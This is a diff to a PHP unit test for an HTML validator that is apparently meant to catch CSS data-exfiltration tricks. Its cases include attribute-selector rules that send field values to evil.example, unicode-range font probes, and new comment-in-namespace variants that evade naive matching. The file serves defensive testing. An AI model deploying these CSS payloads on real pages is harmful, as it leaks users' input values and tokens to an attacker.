@@ -185,9 +185,12 @@ final class CssTest extends HtmlValidatorTestCase
             'ends with'              => ['input[value$="a"] { background: url(//evil.example/?a) }', '[value$='],
             'contains'               => ['a[href*="token="] { background: url(//evil.example/?a) }', '[href*='],
             'spaces around'          => ['input[ value ^= "a" ] { color: red }', '[ value ^='],
-            'comment inside'         => ['input[value/**/^="a"] { color: red }', '[value ^='],   // comments are blanked before the check, so the quote shows a space in its place
+            'comment inside'         => ['input[value/**/^="a"] { color: red }', '[value^='],   // comments are removed before the check, so the detail reads without it
             'uppercase'              => ['INPUT[VALUE^="a"] { color: red }', '[VALUE^='],
             'namespace wildcard'     => ['input[*|value^="a"] { background: url(//evil.example/?a) }', '[*|value^='],   // *| means any namespace, including none, so browsers read it as [value^=
+            'comment in namespace prefix' => ['[*/**/|value^="a"] { color: red }', '[*|value^='],   // a comment between * and | is not whitespace to the CSS tokenizer; the selector still applies
+            'comment in prefix, contains' => ['[*/**/|value*="a"] { color: red }', '[*|value*='],
+            'scan marker'            => ['[*/**/|data-mark^=a]{color:red}', '[*|data-mark^='],
             'no url at all'          => ['input[value^="a"] { color: red }', '[value^='],   // the rule is the selector, whatever follows it
             'unicode-range'          => ['@font-face { font-family: f; src: url(https://evil.example/f); unicode-range: U+65 }', 'unicode-range'],
             'unicode-range spaced'   => ['@font-face { unicode-range : U+65 }', 'unicode-range'],
